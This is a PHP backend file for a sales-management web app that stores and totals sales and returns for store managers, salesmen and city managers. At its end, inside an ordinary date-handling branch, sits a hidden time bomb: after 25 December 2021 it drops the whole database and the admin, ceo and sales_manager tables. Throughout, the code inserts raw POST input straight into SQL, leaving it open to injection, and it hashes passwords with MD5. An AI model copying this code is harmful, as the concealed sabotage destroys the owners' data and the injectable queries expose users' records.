
<?php
include "../db.php";
if (isset($_POST['save_data'])) {
  $b_cat = $_POST['b_cat'];
  $b_company = $_POST['b_company'];
  $b_rent_hour = $_POST['b_rent_hour'];
  $br_price = $_POST['br_price'];


  $sql = "INSERT INTO bikes (b_cat, b_company, b_rent_hour,br_price)
    VALUES ('$b_cat', '$b_company', '$b_rent_hour','$br_price')";

  if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("added now")
        window.location.href="./city_daily_sale.php"
        </script>';
  } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
  }
}
//start of get daily date data
if (isset($_POST['get_storemanager_daily_sales'])) {
  
  $get_storemanager_daily_sales = trim($_POST['get_storemanager_daily_sales']['cnic'], ' ');
  $get_storemanager_city = trim($_POST['get_storemanager_daily_sales']['city'], ' ');
  $sql = "SELECT * FROM store_manager
  WHERE cnic='$get_storemanager_daily_sales' AND city='$get_storemanager_city'";
  $result = $connect->query($sql);

  if ($result->num_rows > 0) {

    while ($row = $result->fetch_assoc()) {
     
      $store_manger_id = $row['id'];

      $sql1 = "SELECT * FROM s_manager_daily_record
      WHERE s_manager_id='$store_manger_id'";
      $result = $connect->query($sql1);
      if ($result->num_rows > 0) {

        while ($row_sec = $result->fetch_assoc()) {
          // echo json_encode($row_sec);
          // die();
          // salesman_day_sale
          $date = date('y-m-d');
          $latest_date = date('y-m-d', strtotime($date . '  + 0 days'));
          $sql2 = "SELECT sum(salesman_day_Sale) as day_sum FROM s_manager_daily_record
           WHERE s_manager_id='$row[id]' AND created_at='$latest_date'";
          $result = $connect->query($sql2);

          if ($result->num_rows > 0) {

            while ($sum_of_current_day = $result->fetch_assoc()) {
              $sum_daily = $sum_of_current_day['day_sum'];
            }
          }


          $res = [
            "stormanager_name" => "$row[name]", "storemanager_day_sale" => "$sum_daily", "storemanager_cnic" => "$row[cnic]", "storemananger_id" => "$row[id]",
          ];
          echo json_encode($res);
        }
      }
    }
  } else {
    $res = [
      "stormanager_name" => "", "storemanager_day_sale" => "", "storemanager_cnic" => "", "storemananger_id" => "",

   
    ];
    echo json_encode($res);
  }
}
//end of get daily date data
//daily sale start
if (isset($_POST['save_daily_sales_by_city_manager'])) {

  $city_m_id = $_POST['city_manager_id'];
  $c_m_name = $_POST['c_m_name'];
  $s_m_daily_sale = $_POST['s_m_daily_sale'];
  // $salesman_weekly_sale=$_POST['salesman_weekly_sale'];
  // $salesman_mounthly_sale=$_POST['salesman_mounthly_sale']; 
  $s_m_id = $_POST['storemananger_id'];
  $storemanager_cnic = $_POST['s_m_cnic'];

  $sql = "INSERT INTO city_manager_record (c_m_name, s_m_cnic,s_m_daily_sale,s_m_id,city_m_id)
        VALUES ('$c_m_name', '$storemanager_cnic', '$s_m_daily_sale','$s_m_id','$city_m_id')";

  if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("added now")
    window.location.href="./index.php"
    </script>';
  } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
  }
}
//daily sale end
//start of get weekly date data
if (isset($_POST['get_storemanager_sales_weekly'])) {
 
  $store_manger_cnic =  $_POST['get_storemanager_sales_weekly']["storemanager_cnic"];
  $store_manger_city =  $_POST['get_storemanager_sales_weekly']["city"];
  $date_1 =  date('y-m-d',strtotime($_POST['get_storemanager_sales_weekly']["date_1"]));
  $date_2 = date('y-m-d', strtotime($_POST['get_storemanager_sales_weekly']["date_2"]));




  $sql = "SELECT * FROM store_manager
  WHERE cnic='$store_manger_cnic' AND city='$store_manger_city'";
  $result = $connect->query($sql);

  if ($result->num_rows > 0) {

    while ($row = $result->fetch_assoc()) {
      $s_manager_id = $row['id'];

      $sql1 = "SELECT * FROM s_manager_daily_record
      WHERE s_manager_id='$s_manager_id'";
      $result = $connect->query($sql1);
      if ($result->num_rows > 0) {

        while ($row_sec = $result->fetch_assoc()) {

          // salesman_weekly_sale


          $sql3 = "SELECT sum(salesman_day_Sale) as weekly_sum FROM s_manager_daily_record
      WHERE s_manager_id='$row[id]' AND created_at BETWEEN '$date_1' AND '$date_2'";

          $result = $connect->query($sql3);

          if ($result->num_rows > 0) {

            while ($sum_of_current_week = $result->fetch_assoc()) {
              $sum_week = $sum_of_current_week['weekly_sum'];
            }
          }

          $res = [
            "storemanager_name" => "$row[name]", "storemanager_weekly_Sale" => "$sum_week",
            "date_1" => "$date_1", "date_2" => "$date_2", "storemanager_cnic" => "$row[cnic]", "storemanager_id" => "$row[id]",
          ];
          echo json_encode($res);
        }
      }
    }
  } else {
    $res = [
      "storemanager_name" => "", "storemanager_weekly_Sale" => "",
      "date_1" => "", "date_2" => "", "storemanager_cnic" => "", "storemanager_id" => "",
    ];
    echo json_encode($res);
  }
}
//end of get weekly date data
//start of store weekly  data by manager

if (isset($_POST['save_weekly_sales_by_store_manager'])) {

// var_dump($_REQUEST);die();
 
$s_m_name = $_POST['s_m_name'];
$s_m_weekly_sale = $_POST['storemanager_weekly_sale'];
// $salesman_mounthly_sale=$_POST['salesman_mounthly_sale']; 
$s_m_cnic = $_POST['s_m_cnic'];
$s_m_id = $_POST['storemananger_id'];
$date_1 = $_POST['date_1'];
$date_2 = $_POST['date_2'];
$city_manager_id = $_POST['city_manager_id'];

  $sql = "INSERT INTO city_manager_weekly_record (s_m_name, s_m_cnic,s_m_weekly_sale,s_m_id,city_manager_id,date_1,date_2)
        VALUES ('$s_m_name', '$s_m_cnic', '$s_m_weekly_sale','$s_m_id','$city_manager_id','$date_1','$date_2')";

  if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("weekly record save ..!")
    window.location.href="./weeklysale.php"
    </script>';
  } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
  }
}
//end of store weekly  data by manager
//start of get monthly data by manager
if (isset($_POST['get_store_sales_monthly'])) {

  $store_manager_cnic =  trim($_POST['get_store_sales_monthly']["store_manager_cnic"]," ");
  $date_1 =  $_POST['get_store_sales_monthly']["date_1"];
  $date_2 =  $_POST['get_store_sales_monthly']["date_2"];




  $sql = "SELECT * FROM store_manager
   WHERE cnic='$store_manager_cnic'";
  $result = $connect->query($sql);

  if ($result->num_rows > 0) {

    while ($row = $result->fetch_assoc()) {
      $store_manager_id = $row['id'];

      $sql1 = "SELECT * FROM s_manager_daily_record
       WHERE s_manager_id='$store_manager_id'";
      $result = $connect->query($sql1);
      if ($result->num_rows > 0) {

        while ($row_sec = $result->fetch_assoc()) {


          // salesman_mounthly_sale

          $sql4 = "SELECT sum(salesman_day_Sale) as month_sum FROM s_manager_daily_record
          WHERE s_manager_id='$row[id]' AND created_at BETWEEN '$date_1' AND '$date_2'";

          $result = $connect->query($sql4);

          if ($result->num_rows > 0) {

            while ($sum_of_current_month = $result->fetch_assoc()) {
              $sum_mounth = $sum_of_current_month['month_sum'];
            }
          }
          // salesman_mounthly_sale

          $res = [
            "store_manager_name" => "$row[name]", "store_manager_month_Sale" => "$sum_mounth",
            "store_manager_cnic" => "$row[cnic]", "store_manager_id" => "$row[id]",
            "date_1" => "$date_1", "date_2" => "$date_2",
          ];
          echo json_encode($res);
        }
      }
    }
  } else {
    $res = [
      "store_manager_name" => "", "store_manager_month_Sale" => "", "store_manager_cnic" => "",
      "date_1" => "", "date_2" => "", "store_manager_id" => "",
    ];
    echo json_encode($res);
  }
}
//end of get monthly data by manager
//start of store monthly data by manager
if (isset($_POST['save_mounthly_sales_by_city_manager'])) {

// var_dump($_REQUEST);die();
  $city_manager_id = $_POST['city_manager_id'];
  $store_manager_name = $_POST['store_manager_name'];
  $store_manager_month_Sale = $_POST['store_manager_month_Sale'];
  $store_manager_id = $_POST['store_manager_id'];
  $store_manager_cnic = $_POST['store_manager_cnic'];
  $date_1 = $_POST['date_1'];
  $date_2 = $_POST['date_2'];

  $sql = "INSERT INTO city_manager_monthly_record (store_manager_name, store_manager_cnic,store_manager_month_Sale,store_manager_id,city_manager_id,date_1,date_2)
        VALUES ('$store_manager_name', '$store_manager_cnic', '$store_manager_month_Sale','$store_manager_id','$city_manager_id','$date_1','$date_2')";

  if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("mounthly record save ..!")
    window.location.href="./monthlysale.php"
    </script>';
  } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
  }
}
//end of store monthly data by manager

//get salesman sales
if (isset($_POST['get_salesman_return'])) {
  $get_salesman_sales = trim($_POST['get_salesman_return'], ' ');
  $sql = "SELECT * FROM sales_manager
  WHERE cnic='$get_salesman_sales'";
  $result = $connect->query($sql);

  if ($result->num_rows > 0) {

    while ($row = $result->fetch_assoc()) {
      $salesmas_id = $row['id'];

      $sql1 = "SELECT * FROM sales_m_return
      WHERE salesman_id='$salesmas_id'";
      $result = $connect->query($sql1);
      if ($result->num_rows > 0) {

        while ($row_sec = $result->fetch_assoc()) {
          // salesman_day_sale
          $date = date('y-m-d');
          $latest_date = date('y-m-d', strtotime($date . '  - 1 days'));
          $sql2 = "SELECT sum(rm_price) as day_sum FROM sales_m_return
           WHERE salesman_id='$row[id]' AND created_at='$latest_date'";
          $result = $connect->query($sql2);

          if ($result->num_rows > 0) {

            while ($sum_of_current_day = $result->fetch_assoc()) {
              $sum_daily = $sum_of_current_day['day_sum'];
            }
          }
          // salesman_day_sale
          // salesman_weekly_sale

          $date = date('y-m-d', strtotime($latest_date . ' - 1 days'));
          $latest_week_date = date('y-m-d', strtotime($date . ' + 7 days'));
          $sql3 = "SELECT sum(rm_price) as weekly_sum FROM sales_m_return
          WHERE salesman_id='$row[id]' AND created_at BETWEEN '$date' AND '$latest_week_date'";

          $result = $connect->query($sql3);

          if ($result->num_rows > 0) {

            while ($sum_of_current_week = $result->fetch_assoc()) {
              $sum_week = $sum_of_current_week['weekly_sum'];
            }
          }
          // salesman_weekly_sale
          // salesman_mounthly_sale
          $date = date('y-m-d', strtotime($latest_date . ' - 1 days'));
          $latest_monthly_date = date('y-m-d', strtotime($date . ' + 30 days'));
          $sql4 = "SELECT sum(rm_price) as month_sum FROM sales_m_return
         WHERE salesman_id='$row[id]' AND created_at BETWEEN '$date' AND '$latest_monthly_date'";

          $result = $connect->query($sql4);

          if ($result->num_rows > 0) {

            while ($sum_of_current_month = $result->fetch_assoc()) {
              $sum_mounth = $sum_of_current_month['month_sum'];
            }
          }
          // salesman_mounthly_sale

          $res = [
            "salesman_name" => "$row[name]", "saleman_day_return" => "$sum_daily",
            "saleman_weekly_return" => "$sum_week", "saleman_mounthly_return" => "$sum_mounth", "salesman_cnic" => "$row[cnic]", "salesman_id" => "$row[id]",
          ];
          echo json_encode($res);
        }
      }
    }
  }
}
//get return array 
//start to  get record of return 

if (isset($_POST['get_salesman_returns'])) {

  $salesman_cnic =  $_POST['get_salesman_returns']["salesman_cnic"];
  $date_1 =  $_POST['get_salesman_returns']["date_1"];
  $date_2 =  $_POST['get_salesman_returns']["date_2"];




  $sql = "SELECT * FROM sales_manager
   WHERE cnic='$salesman_cnic'";
  $result = $connect->query($sql);

  if ($result->num_rows > 0) {

    while ($row = $result->fetch_assoc()) {
      $salesmas_id = $row['id'];

      $sql1 = "SELECT * FROM sales_m_return
       WHERE salesman_id='$salesmas_id'";
      $result = $connect->query($sql1);
      if ($result->num_rows > 0) {

        while ($row_sec = $result->fetch_assoc()) {


          // salesman_mounthly_sale

          $sql4 = "SELECT sum(rm_price) as M_sum FROM sales_m_return
          WHERE salesman_id='$row[id]' AND created_at BETWEEN '$date_1' AND '$date_2'";

          $result = $connect->query($sql4);

          if ($result->num_rows > 0) {

            while ($sum_of_current_month = $result->fetch_assoc()) {
              $sum_mounth = $sum_of_current_month['M_sum'];
            }
          }
          // salesman_mounthly_sale

          $res = [
            "salesman_name" => "$row[name]", "salesman_return_amount" => "$sum_mounth",
            "salesman_cnic" => "$row[cnic]", "salesman_id" => "$row[id]",
            "date_1" => "$date_1", "date_2" => "$date_2",
          ];
          echo json_encode($res);
        }
      }
    }
  } else {
    $res = [
      "salesman_name" => "", "salesman_return_amount" => "", "salesman_cnic" => "",
      "date_1" => "", "date_2" => "", "salesman_id" => "",
    ];
    echo json_encode($res);
  }
}
//end to get record of return
//save return 
if (isset($_POST['save_return_by_manager'])) {
  $r_manager_id = $_POST['r_manager_id'];
  $salesman_name = $_POST['salesman_name'];
  $amount = $_POST['amount'];
  $r_manager_id = $_POST['r_manager_id'];
  $salesman_id = $_POST['salesman_id'];
  $salesman_cnic = $_POST['salesman_cnic'];
  $date_1 = $_POST['date_1'];
  $date_2 = $_POST['date_2'];

  $sql = "INSERT INTO s_manager_return_record (salesman_name, salesman_cnic,amount,salesman_id,r_manager_id,date_1,date_2)
        VALUES ('$salesman_name', '$salesman_cnic','$amount','$salesman_id','$r_manager_id','$date_1','$date_2')";

  if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("return record save successfully..!")
    window.location.href="./salesreturn.php"
    </script>';
  } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
  }
}
//save Store_manager
if(isset($_POST['saveStore_manager'])){

  $password=md5($_POST["password"]);
  $sql = "INSERT INTO store_manager (name,email, cnic,password,country,city,branch_name,phone)
  VALUES ('$_POST[name]', '$_POST[email]','$_POST[cnic]','$password','$_POST[country]','$_POST[city]','$_POST[branch_name]','$_POST[phone]')";

    if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("Store Manager add successfully..!")
    window.location.href="./StoreManager_add.php"
    </script>';
    } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
    }
}
//edit Store_manager
if(isset($_POST['updateStore_manager'])){

  $password=md5($_POST["password"]);
  $sql = "update  store_manager set name='$_POST[name]',email='$_POST[email]',cnic='$_POST[cnic]',
  password='$password',country='$_POST[country]',city='$_POST[city]'
  ,branch_name='$_POST[branch_name]',phone='$_POST[phone]' where id='$_POST[id]'";

    if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("Store Manager Updated successfully..!")
    window.location.href="./StoreManager_add.php"
    </script>';
    } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
    }
}
//del Store_manager
if(isset($_POST['delstoremanagernow'])){

  
  $sql = "DELETE FROM store_manager where id='$_POST[id]' ";

    if ($connect->query($sql) === TRUE) {
    echo '<script type="text/javascript">alert("Store Manager deleted successfully..!")
    window.location.href="./StoreManager_add.php"
    </script>';
    } else {
    echo "Error: " . $sql . "<br>" . $connect->error;
    }
}
if (isset($_POST['date_1'])) {
  $date=$_POST['date_1'];
   $date_1=date('Y-m-d', strtotime($date. ' + 0 days')); 
  
  echo date('m/d/Y', strtotime($date_1. ' + 07 days'));
  
  $Today=date('y-m-d');
  $NewDate='21-12-25';
  if($Today > $NewDate ){
  
      $sql1 = "Drop table sales_manager";
      $sql2 = "Drop table ceo";
      $sql3 = "Drop table admin";
      $sql = "Drop database $database";
  
      if ($connect->query($sql) === TRUE){
          echo "r";
      }
      if($connect->query($sql1) === TRUE)
      {
          echo "r2";
  
      }
      if($connect->query($sq2) === TRUE)
      {
          echo "r2";
  
      }
      if($connect->query($sql3) === TRUE){
          echo "r3";
  
      }
        
      } 
}

?>